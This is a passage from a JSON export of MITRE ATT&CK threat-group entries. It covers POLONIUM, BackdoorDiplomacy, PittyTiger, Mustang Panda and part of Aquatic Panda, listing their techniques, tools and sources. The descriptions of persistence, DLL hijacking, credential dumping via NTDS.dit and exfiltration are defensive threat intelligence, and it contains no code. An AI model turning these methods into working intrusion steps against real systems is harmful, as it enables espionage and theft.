spearphish victims.[1] Enterprise T1204 .002 User Execution: Malicious File Ajax Security Team has lured victims into executing malicious files.[1] Software ID Name References Techniques S0224 Havij [2] Exploit Public-Facing Application S0225 sqlmap [2] Exploit Public-Facing Application References Villeneuve, N. et al.. (2013). OPERATION SAFFRON ROSE . Retrieved May 28, 2020. Check Point Software Technologies. (2015). ROCKET KITTEN: A CAMPAIGN WITH 9 LIVES. Retrieved March 16, 2018. Cedric Pernet, Kenney Lu. (2015, March 19). Operation Woolen-Goldfish - When Kittens Go phishing. Retrieved April 21, 2021. Iran Threats . (2017, December 5). Flying Kitten to Rocket Kitten, A Case of Ambiguity and Shared Code. Retrieved May 28, 2020. Dahl, M.. (2014, May 13). Cat Scratch Fever: CrowdStrike Tracks Newly Reported Iranian Actor as FLYING KITTEN. Retrieved May 27, 2020. "
},
{
"id": 68,
"title": "POLONIUM, Plaid Rain, Group G1005",
"path": "/groups/G1005/index.html",
"content": " POLONIUM POLONIUM is a Lebanon-based group that has primarily targeted Israeli organizations, including critical manufacturing, information technology, and defense industry companies, since at least February 2022. Security researchers assess POLONIUM has coordinated their operations with multiple actors affiliated with Iran\u2019s Ministry of Intelligence and Security (MOIS), based on victim overlap as well as common techniques and tooling.[1] ID: G1005 \u24d8 Associated Groups: Plaid Rain Version: 2.0 Created: 01 July 2022 Last Modified: 08 January 2024 Version Permalink Live Version Associated Group Descriptions Name Description Plaid Rain [2] Techniques Used Domain ID Name Use Enterprise T1583 .006 Acquire Infrastructure: Web Services POLONIUM has created and used legitimate Microsoft OneDrive accounts for their operations.[1] Enterprise T1567 .002 Exfiltration Over Web Service: Exfiltration to Cloud Storage POLONIUM has exfiltrated stolen data to POLONIUM-owned OneDrive and Dropbox accounts.[1] Enterprise T1588 .002 Obtain Capabilities: Tool POLONIUM has obtained and used tools such as AirVPN and plink in their operations.[1] Enterprise T1090 Proxy POLONIUM has used the AirVPN service for operational activity.[1] Enterprise T1199 Trusted Relationship POLONIUM has used compromised credentials from an IT company to target downstream customers including a law firm and aviation company.[1] Enterprise T1078 Valid Accounts POLONIUM has used valid compromised credentials to gain access to victim environments.[1] Enterprise T1102 .002 Web Service: Bidirectional Communication POLONIUM has used OneDrive and DropBox for C2.[1] Software ID Name References Techniques S1023 CreepyDrive [1] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: PowerShell, Data from Local System, Exfiltration Over Web Service: Exfiltration to Cloud Storage, File and Directory Discovery, Ingress Tool Transfer, Use Alternate Authentication Material: Application Access Token, Web Service: Bidirectional Communication S1024 CreepySnail [1] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: PowerShell, Data Encoding: Standard Encoding, Exfiltration Over C2 Channel, System Network Configuration Discovery, System Owner/User Discovery, Valid Accounts: Domain Accounts References Microsoft. (2022, June 2). Exposing POLONIUM activity and infrastructure targeting Israeli organizations. Retrieved July 1, 2022. Microsoft . (2023, July 12). How Microsoft names threat actors. Retrieved November 17, 2023. "
},
{
"id": 69,
"title": "BackdoorDiplomacy, Group G0135",
"path": "/groups/G0135/index.html",
"content": " BackdoorDiplomacy BackdoorDiplomacy is a cyber espionage threat group that has been active since at least 2017. BackdoorDiplomacy has targeted Ministries of Foreign Affairs and telecommunication companies in Africa, Europe, the Middle East, and Asia.[1] ID: G0135 Contributors: Zaw Min Htun, @Z3TAE Version: 1.0 Created: 21 September 2021 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1074 .001 Data Staged: Local Data Staging BackdoorDiplomacy has copied files of interest to the main drive's recycle bin.[1] Enterprise T1190 Exploit Public-Facing Application BackdoorDiplomacy has exploited CVE-2020-5902, an F5 BIP-IP vulnerability, to drop a Linux backdoor. BackdoorDiplomacy has also exploited mis-configured Plesk servers.[1] Enterprise T1574 .001 Hijack Execution Flow: DLL BackdoorDiplomacy has executed DLL search order hijacking.[1] Enterprise T1105 Ingress Tool Transfer BackdoorDiplomacy has downloaded additional files and tools onto a compromised host.[1] Enterprise T1036 .004 Masquerading: Masquerade Task or Service BackdoorDiplomacy has disguised their backdoor droppers with naming conventions designed to blend into normal operations.[1] .005 Masquerading: Match Legitimate Resource Name or Location BackdoorDiplomacy has dropped implants in folders named for legitimate software.[1] Enterprise T1046 Network Service Discovery BackdoorDiplomacy has used SMBTouch, a vulnerability scanner, to determine whether a target is vulnerable to EternalBlue malware.[1] Enterprise T1095 Non-Application Layer Protocol BackdoorDiplomacy has used EarthWorm for network tunneling with a SOCKS5 server and port transfer functionalities.[1] Enterprise T1027 Obfuscated Files or Information BackdoorDiplomacy has obfuscated tools and malware it uses with VMProtect.[1] Enterprise T1588 .001 Obtain Capabilities: Malware BackdoorDiplomacy has obtained and used leaked malware, including DoublePulsar, EternalBlue, EternalRocks, and EternalSynergy, in its operations.[1] .002 Obtain Capabilities: Tool BackdoorDiplomacy has obtained a variety of open-source reconnaissance and red team tools for discovery and lateral movement.[1] Enterprise T1120 Peripheral Device Discovery BackdoorDiplomacy has used an executable to detect removable media, such as USB flash drives.[1] Enterprise T1055 .001 Process Injection: Dynamic-link Library Injection BackdoorDiplomacy has dropped legitimate software onto a compromised host and used it to execute malicious DLLs.[1] Enterprise T1505 .003 Server Software Component: Web Shell BackdoorDiplomacy has used web shells to establish an initial foothold and for lateral movement within a victim's system.[1] Enterprise T1049 System Network Connections Discovery BackdoorDiplomacy has used NetCat and PortQry to enumerate network connections and display the status of related TCP and UDP ports.[1] Software ID Name References Techniques S0020 China Chopper [1] Application Layer Protocol: Web Protocols, Brute Force: Password Guessing, Command and Scripting Interpreter: Windows Command Shell, Data from Local System, File and Directory Discovery, Indicator Removal: Timestomp, Ingress Tool Transfer, Network Service Discovery, Obfuscated Files or Information: Software Packing, Server Software Component: Web Shell S0002 Mimikatz [1] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0590 NBTscan [1] Network Service Discovery, Network Sniffing, Remote System Discovery, System Network Configuration Discovery, System Owner/User Discovery S0262 QuasarRAT [1] Abuse Elevation Control Mechanism: Bypass User Account Control, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores, Data from Local System, Encrypted Channel: Symmetric Cryptography, Hide Artifacts: Hidden Window, Hide Artifacts: Hidden Files and Directories, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Non-Application Layer Protocol, Non-Standard Port, Proxy, Remote Services: Remote Desktop Protocol, Scheduled Task/Job: Scheduled Task, Subvert Trust Controls: Code Signing, System Information Discovery, System Location Discovery, System Network Configuration Discovery, System Owner/User Discovery, Unsecured Credentials: Credentials In Files, Video Capture S0647 Turian [1] Application Layer Protocol: Web Protocols, Archive Collected Data: Archive via Utility, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Unix Shell, Command and Scripting Interpreter: Python, Command and Scripting Interpreter: Windows Command Shell, Data Obfuscation: Junk Data, Data Staged: Local Data Staging, Deobfuscate/Decode Files or Information, File and Directory Discovery, Ingress Tool Transfer, Masquerading: Masquerade Task or Service, Obfuscated Files or Information, Peripheral Device Discovery, Screen Capture, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery References Adam Burgher. (2021, June 10). BackdoorDiplomacy: Upgrading from Quarian to Turian. Retrieved September 1, 2021 "
},
{
"id": 70,
"title": "PittyTiger, Group G0011",
"path": "/groups/G0011/index.html",
"content": " PittyTiger PittyTiger is a threat group believed to operate out of China that uses multiple different types of malware to maintain command and control.[1][2] ID: G0011 Version: 1.2 Created: 31 May 2017 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1588 .002 Obtain Capabilities: Tool PittyTiger has obtained and used tools such as Mimikatz and gsecdump.[1] Enterprise T1078 Valid Accounts PittyTiger attempts to obtain legitimate credentials during operations.[1] Software ID Name References Techniques S0032 gh0st RAT [1][2] Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Deobfuscate/Decode Files or Information, Dynamic Resolution: Fast Flux DNS, Encrypted Channel: Symmetric Cryptography, Encrypted Channel, Hijack Execution Flow: DLL, Indicator Removal: Clear Windows Event Logs, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Non-Application Layer Protocol, Process Discovery, Process Injection, Query Registry, Screen Capture, Shared Modules, System Binary Proxy Execution: Rundll32, System Information Discovery, System Services: Service Execution S0008 gsecdump [1] OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSA Secrets S0010 Lurid [2] Archive Collected Data, Encrypted Channel: Symmetric Cryptography S0002 Mimikatz [1] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0012 PoisonIvy [2] Application Window Discovery, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Active Setup, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data from Local System, Data Staged: Local Data Staging, Encrypted Channel: Symmetric Cryptography, Execution Guardrails: Mutual Exclusion, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Obfuscated Files or Information, Process Injection: Dynamic-link Library Injection, Rootkit References Bizeul, D., Fontarensky, I., Mouchoux, R., Perigaud, F., Pernet, C. (2014, July 11). Eye of the Tiger. Retrieved September 29, 2015. Villeneuve, N., Homan, J. (2014, July 31). Spy of the Tiger. Retrieved September 29, 2015. "
},
{
"id": 71,
"title": "Mustang Panda, TA416, RedDelta, BRONZE PRESIDENT, Group G0129",
"path": "/groups/G0129/index.html",
"content": " Mustang Panda Mustang Panda is a China-based cyber espionage threat actor that was first observed in 2017 but may have been conducting operations since at least 2014. Mustang Panda has targeted government entities, nonprofits, religious, and other non-governmental organizations in the U.S., Europe, Mongolia, Myanmar, Pakistan, and Vietnam, among others.[1][2][3] ID: G0129 \u24d8 Associated Groups: TA416, RedDelta, BRONZE PRESIDENT Contributors: Kyaw Pyiyt Htet, @KyawPyiytHtet Version: 2.1 Created: 12 April 2021 Last Modified: 16 April 2025 Version Permalink Live Version Associated Group Descriptions Name Description TA416 [4] RedDelta [5][6] BRONZE PRESIDENT [3] Campaigns ID Name First Seen Last Seen References Techniques C0047 RedDelta Modified PlugX Infection Chain Operations July 2023 [7] December 2024 [7] RedDelta Modified PlugX Infection Chain Operations was an campaign linked to Mustang Panda operations.[7] Acquire Infrastructure: Domains, Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: PowerShell, Execution Guardrails, Exploitation for Client Execution, Hide Artifacts: Hidden Files and Directories, Hijack Execution Flow: DLL, Masquerading: Masquerade Task or Service, Non-Application Layer Protocol, Obfuscated Files or Information: Encrypted/Encoded File, Obtain Capabilities: Digital Certificates, Phishing: Spearphishing Link, Phishing: Spearphishing Attachment, Proxy, Stage Capabilities: Upload Malware, Subvert Trust Controls: Code Signing, System Binary Proxy Execution: Msiexec, System Binary Proxy Execution: MMC, System Information Discovery, User Execution: Malicious File, User Execution: Malicious Link Techniques Used Domain ID Name Use Enterprise T1583 .001 Acquire Infrastructure: Domains Mustang Panda have acquired C2 domains prior to operations.[3][5][8] Mustang Panda registered adversary-controlled domains during RedDelta Modified PlugX Infection Chain Operations that were re-registrations of expired domains.[7] Enterprise T1071 .001 Application Layer Protocol: Web Protocols Mustang Panda has communicated with its C2 via HTTP POST requests.[2][3][5][8] Mustang Panda used HTTP POST messages for command and control from PlugX installations during RedDelta Modified PlugX Infection Chain Operations.[7] Enterprise T1560 .001 Archive Collected Data: Archive via Utility Mustang Panda has used RAR to create password-protected archives of collected documents prior to exfiltration.[3][9] .003 Archive Collected Data: Archive via Custom Method Mustang Panda has encrypted documents with RC4 prior to exfiltration.[9] Enterprise T1119 Automated Collection Mustang Panda used custom batch scripts to collect files automatically from a targeted system.[3] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder Mustang Panda has created the registry key HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\AdobelmdyU to maintain persistence.[4] Mustang Panda used Run registry keys with names such as OneNote Update to execute legitimate executables that would load through search-order hijacking malicious DLLS to ensure persistence during RedDelta Modified PlugX Infection Chain Operations.[7] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell Mustang Panda has used malicious PowerShell scripts to enable execution.[1][2] Mustang Panda used LNK files to execute PowerShell commands leading to eventual PlugX installation during RedDelta Modified PlugX Infection Chain Operations.[7] .003 Command and Scripting Interpreter: Windows Command Shell Mustang Panda has executed HTA files via cmd.exe, and used batch scripts for collection.[2][9] .005 Command and Scripting Interpreter: Visual Basic Mustang Panda has embedded VBScript components in LNK files to download additional files and automate collection.[1][2][3] Enterprise T1074 .001 Data Staged: Local Data Staging Mustang Panda has stored collected credential files in c:\\windows\\temp prior to exfiltration. Mustang Panda has also stored documents for exfiltration in a hidden folder on USB drives.[3][9] Enterprise T1573 .001 Encrypted Channel: Symmetric Cryptography Mustang Panda has encrypted C2 communications with RC4.[5] Enterprise T1585 .002 Establish Accounts: Email Accounts Mustang Panda has leveraged the legitimate email marketing service SMTP2Go for phishing campaigns.[6] Enterprise T1546 .003 Event Triggered Execution: Windows Management Instrumentation Event Subscription Mustang Panda's custom ORat tool uses a WMI event consumer to maintain persistence.[3] Enterprise T1480 Execution Guardrails Mustang Panda included the use of Cloudflare geofencing mechanisms to limit payload download activity during RedDelta Modified PlugX Infection Chain Operations.[7] Enterprise T1052 .001 Exfiltration Over Physical Medium: Exfiltration over USB Mustang Panda has used a customized PlugX variant which could exfiltrate documents from air-gapped networks.[9] Enterprise T1203 Exploitation for Client Execution Mustang Panda has exploited CVE-2017-0199 in Microsoft Word to execute code.[1] Mustang Panda used the GrimResource exploitation technique via specially crafted MSC files for arbitrary code execution during RedDelta Modified PlugX Infection Chain Operations.[7] Enterprise T1083 File and Directory Discovery Mustang Panda has searched the entire target system for DOC, DOCX, PPT, PPTX, XLS, XLSX, and PDF files.[9] Enterprise T1564 .001 Hide Artifacts: Hidden Files and Directories Mustang Panda's PlugX variant has created a hidden folder on USB drives named RECYCLE.BIN to store malicious executables and collected data.[9] Mustang Panda stored encrypted payloads associated with PlugX installation in hidden directories during RedDelta Modified PlugX Infection Chain Operations.[7] Enterprise T1574 .001 Hijack Execution Flow: DLL Mustang Panda has used a legitimately signed executable to execute a malicious payload within a DLL file.[2][5][4] Mustang Panda used DLL search order hijacking on vulnerable applications to install PlugX payloads during RedDelta Modified PlugX Infection Chain Operations.[7] Enterprise T1070 .004 Indicator Removal: File Deletion Mustang Panda will delete their tools and files, and kill processes after their objectives are reached.[3] Enterprise T1105 Ingress Tool Transfer Mustang Panda has downloaded additional executables following the initial infection stage.[5] Enterprise T1036 .004 Masquerading: Masquerade Task or Service Mustang Panda masqueraded Registry run keys as legitimate-looking service names such as OneNote Update during RedDelta Modified PlugX Infection Chain Operations.[7] .005 Masquerading: Match Legitimate Resource Name or Location Mustang Panda has used names like adobeupdate.dat and PotPlayerDB.dat to disguise PlugX, and a file named OneDrive.exe to load a Cobalt Strike payload.[5] .007 Masquerading: Double File Extension Mustang Panda has used an additional filename extension to hide the true file type.[1][2] Enterprise T1095 Non-Application Layer Protocol Mustang Panda communicated over TCP 5000 from adversary administrative servers to adversary command and control nodes during RedDelta Modified PlugX Infection Chain Operations.[7] Enterprise T1027 Obfuscated Files or Information Mustang Panda has delivered initial payloads hidden using archives and encoding measures.[1][2][3][5][4][6] .013 Encrypted/Encoded File Mustang Panda stored installation payloads as encrypted files in hidden folders during RedDelta Modified PlugX Infection Chain Operations.[7] .016 Junk Code Insertion Mustang Panda has used junk code within their DLL files to hinder analysis.[9] Enterprise T1588 .004 Obtain Capabilities: Digital Certificates Mustang Panda acquired Cloudflare Origin CA TLS certificates during RedDelta Modified PlugX Infection Chain Operations.[7] Enterprise T1003 .003 OS Credential Dumping: NTDS Mustang Panda has used vssadmin to create a volume shadow copy and retrieve the NTDS.dit file. Mustang Panda has also used reg save on the SYSTEM file Registry location to help extract the NTDS.dit file.[3] Enterprise T1566 .001 Phishing: Spearphishing Attachment Mustang Panda has used spearphishing attachments to deliver initial access payloads.[5][4][10] Mustang Panda leveraged malicious attachments in spearphishing emails for initial access to victim environments in RedDelta Modified PlugX Infection Chain Operations.[7] .002 Phishing: Spearphishing Link Mustang Panda has delivered malicious links to their intended targets.[8] Mustang Panda distributed malicious links in phishing emails leading to HTML files that would direct the victim to malicious MSC files if running Windows based on User Agent fingerprinting during RedDelta Modified PlugX Infection Chain Operations.[7] Enterprise T1598 .003 Phishing for Information: Spearphishing Link Mustang Panda has delivered web bugs to profile their intended targets.[6] Enterprise T1057 Process Discovery Mustang Panda has used tasklist /v to determine active process information.[9] Enterprise T1090 Proxy Mustang Panda proxied communication through the Cloudflare CDN service during RedDelta Modified PlugX Infection Chain Operations.[7] Enterprise T1219 .002 Remote Access Tools: Remote Desktop Software Mustang Panda has installed TeamViewer on targeted systems.[3] Enterprise T1091 Replication Through Removable Media Mustang Panda has used a customized PlugX variant which could spread through USB connections.[9] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task Mustang Panda has created a scheduled task to execute additional malicious software, as well as maintain persistence.[2][3][8] Enterprise T1518 Software Discovery Mustang Panda has searched the victim system for the InstallUtil.exe program and its version.[2] Enterprise T1608 Stage Capabilities Mustang Panda has used servers under their control to validate tracking pixels sent to phishing victims.[6] .001 Upload Malware Mustang Panda has hosted malicious payloads on DropBox including PlugX.[6] Mustang Panda staged malware on adversary-controlled domains and cloud storage instances during RedDelta Modified PlugX Infection Chain Operations.[7] Enterprise T1553 .002 Subvert Trust Controls: Code Signing Mustang Panda used legitimate, signed binaries such as inkform.exe or ExcelRepairToolboxLauncher.exe for follow-on execution of malicious DLLs through DLL search order hijacking in RedDelta Modified PlugX Infection Chain Operations.[7] Enterprise T1218 .004 System Binary Proxy Execution: InstallUtil Mustang Panda has used InstallUtil.exe to execute a malicious Beacon stager.[2] .005 System Binary Proxy Execution: Mshta Mustang Panda has used mshta.exe to launch collection scripts.[3] .007 System Binary Proxy Execution: Msiexec Mustang Panda initial payloads downloaded a Windows Installer MSI file that in turn dropped follow-on files leading to installation of PlugX during RedDelta Modified PlugX Infection Chain Operations.[7] .014 System Binary Proxy Execution: MMC Mustang Panda used Microsoft Management Console Snap-In Control files, or MSC files, executed via MMC to run follow-on PowerShell commands during RedDelta Modified PlugX Infection Chain Operations.[7] Enterprise T1082 System Information Discovery Mustang Panda has gathered system information using systeminfo.[9] Mustang Panda captured victim operating system type via User Agent analysis during RedDelta Modified PlugX Infection Chain Operations.[7] Enterprise T1016 System Network Configuration Discovery Mustang Panda has used ipconfig and arp to determine network configuration information.[9] Enterprise T1049 System Network Connections Discovery Mustang Panda has used netstat -ano to determine network connection information.[9] Enterprise T1204 .001 User Execution: Malicious Link Mustang Panda has sent malicious links including links directing victims to a Google Drive folder.[1][8][6] Mustang Panda distributed hyperlinks that would result in an MSC file running a PowerShell command to download and install a remotely-hosted MSI file during RedDelta Modified PlugX Infection Chain Operations.[7] .002 User Execution: Malicious File Mustang Panda has sent malicious files requiring direct victim interaction to execute.[1][2][9][5][10][6] Mustang Panda distributed malicious LNK objects for user execution during RedDelta Modified PlugX Infection Chain Operations.[7] Enterprise T1102 Web Service Mustang Panda has used DropBox URLs to deliver variants of PlugX.[6] Enterprise T1047 Windows Management Instrumentation Mustang Panda has executed PowerShell scripts via WMI.[2][3] Software ID Name References Techniques S0154 Cobalt Strike [1][2][3][5][8] Abuse Elevation Control Mechanism: Sudo and Sudo Caching, Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: Parent PID Spoofing, Access Token Manipulation: Token Impersonation/Theft, Access Token Manipulation: Make and Impersonate Token, Account Discovery: Domain Account, Application Layer Protocol: DNS, Application Layer Protocol: Web Protocols, Application Layer Protocol: File Transfer Protocols, BITS Jobs, Browser Session Hijacking, Command and Scripting Interpreter: JavaScript, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Python, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Data from Local System, Data Obfuscation: Protocol or Service Impersonation, Data Transfer Size Limits, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Exploitation for Client Execution, Exploitation for Privilege Escalation, File and Directory Discovery, Hide Artifacts: Process Argument Spoofing, Impair Defenses: Disable or Modify Tools, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Network Service Discovery, Network Share Discovery, Non-Application Layer Protocol, Obfuscated Files or Information: Indicator Removal from Tools, Obfuscated Files or Information, Office Application Startup: Office Template Macros, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Process Discovery, Process Injection: Dynamic-link Library Injection, Process Injection: Process Hollowing, Process Injection, Protocol Tunneling, Proxy: Domain Fronting, Proxy: Internal Proxy, Query Registry, Reflective Code Loading, Remote Services: Remote Desktop Protocol, Remote Services: SSH, Remote Services: Windows Remote Management, Remote Services: SMB/Windows Admin Shares, Remote Services: Distributed Component Object Model, Remote System Discovery, Scheduled Transfer, Screen Capture, Software Discovery, Subvert Trust Controls: Code Signing, System Binary Proxy Execution: Rundll32, System Network Configuration Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, Use Alternate Authentication Material: Pass the Hash, Valid Accounts: Domain Accounts, Valid Accounts: Local Accounts, Windows Management Instrumentation S0590 NBTscan [3] Network Service Discovery, Network Sniffing, Remote System Discovery, System Network Configuration Discovery, System Owner/User Discovery S0013 PlugX [1][2][3][9][5][6] Application Layer Protocol: Web Protocols, Application Layer Protocol: DNS, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, File and Directory Discovery, Hide Artifacts: Hidden Files and Directories, Hijack Execution Flow: DLL, Impair Defenses: Disable or Modify System Firewall, Ingress Tool Transfer, Input Capture: Keylogging, Masquerading: Masquerade Task or Service, Masquerading: Match Legitimate Resource Name or Location, Modify Registry, Native API, Network Share Discovery, Non-Application Layer Protocol, Non-Standard Port, Obfuscated Files or Information, Process Discovery, Query Registry, Screen Capture, System Network Connections Discovery, Trusted Developer Utilities Proxy Execution: MSBuild, Virtualization/Sandbox Evasion: System Checks, Web Service: Dead Drop Resolver S0012 PoisonIvy [1][5] Application Window Discovery, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Active Setup, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data from Local System, Data Staged: Local Data Staging, Encrypted Channel: Symmetric Cryptography, Execution Guardrails: Mutual Exclusion, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Obfuscated Files or Information, Process Injection: Dynamic-link Library Injection, Rootkit S0662 RCSession [3] Abuse Elevation Control Mechanism: Bypass User Account Control, Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Data from Local System, Encrypted Channel, Hijack Execution Flow: DLL, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Keylogging, Masquerading, Modify Registry, Native API, Non-Application Layer Protocol, Obfuscated Files or Information: Compression, Obfuscated Files or Information: Fileless Storage, Process Discovery, Process Injection: Process Hollowing, Screen Capture, System Binary Proxy Execution: Msiexec, System Information Discovery, System Owner/User Discovery S0596 ShadowPad Mustang Panda used similar installation techniques with DLL sideloading to install ShadowPad during RedDelta Modified PlugX Infection Chain Operations.[7] Application Layer Protocol: DNS, Application Layer Protocol: File Transfer Protocols, Application Layer Protocol: Web Protocols, Data Encoding: Non-Standard Encoding, Deobfuscate/Decode Files or Information, Dynamic Resolution: Domain Generation Algorithms, Indicator Removal, Ingress Tool Transfer, Modify Registry, Non-Application Layer Protocol, Obfuscated Files or Information: Fileless Storage, Obfuscated Files or Information, Process Discovery, Process Injection, Process Injection: Dynamic-link Library Injection, Scheduled Transfer, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, System Time Discovery References Meyers, A. (2018, June 15). Meet CrowdStrike\u2019s Adversary of the Month for June: MUSTANG PANDA. Retrieved April 12, 2021. Anomali Threat Research. (2019, October 7). China-Based APT Mustang Panda Targets Minority Groups, Public and Private Sector Organizations. Retrieved April 12, 2021. Counter Threat Unit Research Team. (2019, December 29). BRONZE PRESIDENT Targets NGOs. Retrieved April 13, 2021. Proofpoint Threat Research Team. (2020, November 23). TA416 Goes to Ground and Returns with a Golang PlugX Malware Loader. Retrieved April 13, 2021. Insikt Group. (2020, July 28). CHINESE STATE-SPONSORED GROUP \u2018REDDELTA\u2019 TARGETS THE VATICAN AND CATHOLIC ORGANIZATIONS. Retrieved April 13, 2021. Raggi, M. et al. (2022, March 7). The Good, the Bad, and the Web Bug: TA416 Increases Operational Tempo Against European Governments as Conflict in Ukraine Escalates. Retrieved March 16, 2022. Insikt Group. (2025, January 9). Chinese State-Sponsored RedDelta Targeted Taiwan, Mongolia, and Southeast Asia with Adapted PlugX Infection Chain. Retrieved January 14, 2025. Roccia, T., Seret, T., Fokker, J. (2021, March 16). Technical Analysis of Operation Dianxun. Retrieved April 13, 2021. Hamzeloofard, S. (2020, January 31). New wave of PlugX targets Hong Kong | Avira Blog. Retrieved April 13, 2021. Huntley, S. (2022, March 7). An update on the threat landscape. Retrieved March 16, 2022. "
},
{
"id": 72,
"title": "Aquatic Panda, Group G0143",
"path": "/groups/G0143/index.html",
"content": " Aquatic Panda Aquatic Panda is a suspected China-based threat group with a dual mission of intelligence collection and industrial espionage. Active since at least May 2020, Aquatic Panda has primarily targeted entities in the telecommunications, technology, and government sectors.[1] ID: G0143 Contributors: NST Assure Research Team, NetSentries Technologies; Pooja Natarajan, NEC Corporation India; Hiroki Nagahama, NEC Corporation; Manikantan Srinivasan, NEC Corporation India; Jai Minton, CrowdStrike; Jennifer Kim Roman, CrowdStrike Version: 2.0 Created: 18 January 2022 Last Modified: 10 October 2024 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1087 Account Discovery Aquatic Panda used the last command in Linux environments to identify recently logged-in users on victim machines.[2] Enterprise T1595 .002 Active Scanning: Vulnerability Scanning Aquatic Panda has used publicly accessible DNS logging services to identify servers vulnerable to Log4j (CVE 2021-44228).[1] Enterprise T1560 .001 Archive Collected Data: Archive via Utility Aquatic Panda has used several publicly available tools, including WinRAR and 7zip, to compress collected files and memory dumps prior to exfiltration.[1][2] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell Aquatic Panda has downloaded additional scripts and executed Base64 encoded commands in PowerShell.[1] .003 Command and Scripting Interpreter: Windows Command Shell Aquatic Panda has attempted and failed to run Bash commands on a Windows host by passing them to cmd /C.[1] .004 Command and Scripting Interpreter: Unix Shell Aquatic Panda used malicious shell scripts in Linux environments following access via SSH to install Linux versions of Winnti malware.[2] Enterprise T1543 .003 Create or Modify System Process: Windows Service Aquatic Panda created new Windows services for persistence that masqueraded as legitimate Windows services via name change.[2] Enterprise T1005 Data from Local System Aquatic Panda captured local Windows security event log data from victim machines using the wevtutil utility to extract contents to an evtx output file.[2] Enterprise T1574 .001 Hijack Execution Flow: DLL Aquatic Panda has used DLL search-order hijacking to load exe, dll, and dat files into memory.[1] Aquatic Panda loaded a malicious DLL into the legitimate Windows Security Health Service executable (SecurityHealthService.exe) to execute malicious code on victim systems.[2] .006 Hijack Execution Flow: Dynamic Linker Hijacking Aquatic Panda modified the ld.so preload file in Linux environments to enable persistence for Winnti malware.[2] Enterprise T1562 .001 Impair Defenses: Disable or Modify Tools Aquatic Panda has attempted to stop endpoint detection and response (EDR) tools on compromised systems.[1] Enterprise T1070 .001 Indicator Removal: Clear Windows Event Logs Aquatic Panda clears Windows Event Logs following activity to evade defenses.[2] .003 Indicator Removal: Clear Command History Aquatic Panda cleared command history in Linux environments to remove traces of activity after operations.[2] .004 Indicator Removal: File Deletion Aquatic Panda has deleted malicious executables from compromised machines.[1][2] Enterprise T1105 Ingress Tool Transfer Aquatic Panda has downloaded additional malware onto compromised hosts.[1] Enterprise T1654 Log Enumeration Aquatic Panda enumerated logs related to authentication in Linux environments prior to deleting selective entries for defense evasion purposes.[2] Enterprise T1036 